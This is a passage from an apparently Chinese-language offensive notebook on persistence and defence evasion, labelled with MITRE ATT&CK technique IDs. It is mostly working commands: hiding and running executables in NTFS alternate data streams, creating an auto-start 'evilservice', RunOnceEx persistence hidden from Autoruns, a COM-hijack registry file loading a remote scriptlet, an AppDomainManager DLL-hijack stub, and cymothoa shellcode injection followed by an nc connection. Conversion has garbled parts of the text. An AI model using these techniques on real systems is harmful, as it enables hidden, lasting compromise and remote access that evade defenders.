> echo \"empty file\" \> c:\\ADS\\file.txt
>
> findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\procexp.exe \>
> c:\\ADS\\file.txt:procexp. exe
>
> wmic process call create \'\"c:\\ADS\\file.txt:procexp.exe\"\' echo
> \"empty file\" \> c:\\ADS\\file.txt
>
> type c:\\windows\\system32\\cmd.exe \> c:\\ADS\\file.txt:cmd.exe
>
> sc create evilservice binPath= \"\\\"c:\\ADS\\file.txt:cmd.exe\\\" /c
> echo works \> \\\"c:\\AD
>
> S\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto sc start
> evilservice
![](media/image155.jpeg){width="5.787687007874016in"
height="5.151041119860017in"}
> print /d:c:\\Users\\demon\\1.txt:procexp.exe
> c:\\Users\\demon\\procexp.exe wmic process call create
> \'\"C:\\Users\\demon\\1.txt:procexp.exe\"\'
https://[www.youtube.com/watch?v=nPBcSP8M7KE&feature=youtu.be](http://www.youtube.com/watch?v=nPBcSP8M7KE&feature=youtu.be)
Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-
streams-and-how-to-execute-it-part-2/
## ADS 数据流(T1137)
####### TeamViewer13
> C :\\\>type :\\temp\\helloworld.hta \>\"C :\\Program Files
> (x86)\\TeamViewer\\TeamViewe r13_Logfile.log:helloworld.hta\"
>
> C :\\\>mshta\"c :\\Program Files
> (x86)\\TeamViewer\\TeamViewer13_Logfile.log:hellowo rld.hta\"
![](media/image156.jpeg){width="5.799379921259843in"
height="2.241874453193351in"}![](media/image157.jpeg){width="5.802555774278215in"
height="2.0425in"}![](media/image158.jpeg){width="5.74043416447944in"
height="2.0468744531933507in"}
####### PHP
未寄宿 可以执行
![](media/image159.jpeg){width="5.853898731408574in"
height="0.3261450131233596in"}
![](media/image160.png){width="5.833333333333333in"
height="0.328332239720035in"}删除文件
![](media/image161.jpeg){width="5.096665573053368in"
height="2.07in"}删除文件----寄宿数据流成功，并可以运行
####### Control
![](media/image162.jpeg){width="5.856928040244969in"
height="1.6031244531933508in"}![](media/image163.jpeg){width="5.750653980752406in"
height="2.4054166666666665in"}
链接资料：https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-
streams-and-how-to-execute-it/
https://twitter.com/bohops/status/954466315913310209
## 3.RunOnceEx (T1137)
使用RunOnceEx 进行持久化 - 隐藏自Autoruns.exe
1.  发现一种技术来执行DLL 文件，而不会在登录时被autoruns.exe 检测到。
    需要管理员权限，不属于userland。
运行这个漏洞
> reg add
> HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\
> Depend /v 1 /d \"C:\\Users\\demon\\mbox.dll\"
![](media/image164.jpeg){width="5.839421478565179in"
height="0.7991666666666667in"}
2.  mbox.dll 将在下次登录时启动。或者你可以运行这个命令来触发执行：
> runonce /Explorer
链接(link)：https://oddvar.moe/2018/03/21/persistence-using-runonceex-
hidden-from-autoruns-exe/ https://support.microsoft.com/en-
us/help/310593/description-of-the-runonceex-registry-key
内含视频 ：
https://[www.ggsec.cn/RunOnceEx.html](http://www.ggsec.cn/RunOnceEx.html)
## winlogon_regedit (T1137 ) (T1004)
> Microsoft 组件对象模型（COM）是Windows
> 内的一个系统，用于通过操作系统实现软件组件之间的交互。
>
> 1 攻击者可以使用这个系统插入恶意代码，通过劫持COM
> 引用和关系来代替合法的软件来执行持久化。
>
> 劫持COM 对象需要在Windows
> 注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作
>
> 的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。2
> 攻击者很可能劫
>
> 持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致
>
> 检测的系统不稳定。
>
> Windows Registry Editor Version 5.00
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00\]
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam.1.00\\CLSID\]
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
>
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam\]
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicRedTeam\\CLSID\]
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
> 0-0000FEEDACDC}\]
>
> @=\"AtomicRedTeam\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\InprocServer32\]
> @=\"C:\\\\WINDOWS\\\\system32\\\\scrobj.dll\"
>
> \"ThreadingModel\"=\"Apartment\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
> 0-0000FEEDACDC}\\ProgID\]
>
> @=\"AtomicRedTeam.1.00\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\ScriptletURL\]
> @=\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Win
> dows/Payloads/COMHijackScripts/AtomicRedTeam.sct\"
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-000
>
> 0-0000FEEDACDC}\\VersionIndependentProgID\] @=\"AtomicRedTeam\"
>
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD
> 7-FBEEA2180A1E}\]
> \[HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{06DA0625-9701-43DA-BFD
> 7-FBEEA2180A1E}\\TreatAs\]
>
> @=\"{00000001-0000-0000-0000-0000FEEDACDC}\"
![](media/image165.jpeg){width="5.281761811023622in" height="2.51625in"}
https://twitter.com/subTee/status/962767403464577024
https://attack.mitre.org/wiki/Technique/T1122
https://gist.github.com/anonymous/3929d9df4035abec725bcdc36659fce5
详细请看视频内容
：https://[www.ggsec.cn/winlogon-regedit.html](http://www.ggsec.cn/winlogon-regedit.html)
5.  **Image*File*Execution*Options*cmd(T1183)**
![](media/image166.jpeg){width="5.801456692913386in" height="6.37in"}
恶意代码中，批量的程序， 启动时 启动 svchost.exe
![](media/image167.jpeg){width="5.826403105861767in"
height="6.305833333333333in"}
> 参考资料 ：https://neonprimetime.blogspot.com/2018/01/java-adwind-rat-
> uses-image-
> file.html?utmcampaign=crowdfire&utmcontent=crowdfire&utmmedium=social
> &utmsource=twitter%232362224631-tw%231515608604431
视频内容：
https://[www.ggsec.cn/Image-File-Execution-Options-cmd.html](http://www.ggsec.cn/Image-File-Execution-Options-cmd.html)
## C#内存加载执行 mimikatz 之 dll 劫持(T1038)
> using System;
>
> using System.EnterpriseServices; using System.Runtime.InteropServices;
>
> public sealed class MyAppDomainManager : AppDomainManager
>
> {
>
> public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
>
> {
>
> System.Windows.Forms.MessageBox.Show(\"AppDomain - KaBoom!\");
>
> //YouhavemorecontrolherethanIamdemonstrating.Forexample,
> youcansetApplicationBase,
>
> //OryoucanOverridetheAssemblyResolver,etc\...
>
> return;
>
> }
>
> }
>
> /\*
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe/target:library/out:tas
> ks.dlltasks.cs
> setAPPDOMAIN_MANAGER_ASM=tasks,Version=0.0.0.0,Culture=neutral,PublicKe
> yToken=null
>
> setAPPDOMAIN_MANAGER_TYPE=MyAppDomainManager
> setCOMPLUS_Version=v4.0.30319
> copytasks.dllC:\\Windows\\System32\\Tasks\\tasks.dll
> copytasks.dllC:\\Windows\\SysWow64\\Tasks\\tasks.dll
>
> FileHistory/?
>
> \*/
![](media/image168.jpeg){width="5.806492782152231in"
height="3.785833333333333in"}
![](media/image169.jpeg){width="5.833333333333333in"
height="3.138333333333333in"}ht
tps://gist.github.com/caseysmithrc/4bb34d28fa9d4071596cf2417fee5e37C#
内存加载执行mimikatz 之dll 劫持
> ![](media/image170.jpeg){width="5.833333333333333in"
> height="3.9166655730533684in"}ht
tps://twitter.com/subTee/status/1157521629695508480
https://gist.github.com/caseysmithrc/3a4db14d571e902dc8c2e00fdbb9907f
https://gist.github.com/demonsec666/644c6905cabe405364efe2ceea29e3 0c
## Run-key-hexacorn 持久性 1
1.构建
> ![](media/image171.jpeg){width="5.833333333333333in"
> height="5.148332239720035in"}2.
生成
> ![](media/image172.jpeg){width="5.833333333333333in"
> height="3.2583333333333333in"}3.
修改
![](media/image173.jpeg){width="5.757619203849519in"
height="3.0021872265966754in"}
> ![](media/image174.jpeg){width="5.833333333333333in"
> height="3.585in"}4.
复制
![](media/image175.jpeg){width="5.760014216972879in"
height="3.584374453193351in"}
> ![](media/image176.jpeg){width="5.833333333333333in"
> height="2.733332239720035in"}5.
执行
![](media/image177.jpeg)
part-101/
## Run-key-hexacorn 持久性 2
> ![](media/image179.png){width="5.833333333333333in"
> height="8.256666666666666in"}\`\`
> HKCR\\Directory\\Background\\shell\\test @="Launch Chrome"
> HKCR\\Directory\\Background\\shell\\test\\command
> @="c:\\\\windows\\\\system32\\\\calc.exe"
## linux 权限维持
linux
安全性较高，有完善的安全机制，利用难度较高，以下利用方式都存在缺陷，实际过程中，破解多个高权限账号的密码为最优解。
####### 进程注入
使 用 cymothoa https://github.com/jorik041/cymothoa
> ps -aux 查看程序的pid （windows 使用 tasklist）
>
> Cymothoa -p（目标进程pid） 982 -s(shellcode 编号) 1-y 3333(指定payload
> 服务端口)
>
> nc -nv 192.168.31.47 4444
该工具需要先编译
![](media/image180.jpeg){width="5.847931977252843in"
height="3.0459372265966755in"}
工具的详细介绍如下：
![](media/image181.jpeg){width="5.80696084864392in"
height="4.97739501312336in"}